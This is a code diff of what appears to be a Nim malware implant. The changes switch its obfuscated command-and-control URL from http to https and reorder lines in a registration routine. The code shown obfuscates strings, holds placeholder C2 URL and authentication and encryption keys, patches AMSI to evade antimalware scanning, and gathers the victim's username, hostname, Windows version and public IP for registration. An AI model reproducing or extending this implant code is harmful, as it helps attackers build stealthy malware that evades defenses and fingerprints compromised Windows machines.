@@ -31,7 +31,7 @@ randomize()
 
 
 var id: string = [$chr(rand(97..122)), $chr(rand(97..122)), $chr(rand(97..122)), $chr(rand(97..122))].join("")
-var url: string = obfi("http://" & "URL")
+var url: string = obfi("https://" & "URL")
 var identifier = obfi("AUTH_KEY")
 var encKey = obfi("RCKEY")
 
@@ -91,6 +91,7 @@ proc getWindowsVersion*() : string =
     var vInfo = obfi("Windows ") & $versionInfo.dwMajorVersion & obfi(" build ") & $versionInfo.dwBuildNumber
     result = vInfo
     echo result
+
     
 proc register() =
     var buffer = newString(UNLEN + 1)
@@ -107,12 +108,13 @@ proc register() =
 
     var hostname = getHostname()
 
+    var operatingSystem = getWindowsVersion()
+
     const source = obfi("http://ipv4.icanhazip.com")
 
     var amsistate = PatchAmsi()
 
-    var operatingSystem = getWindowsVersion()
-
+    
     let response = get(source)
     var resultIP = $response.body.strip()
 
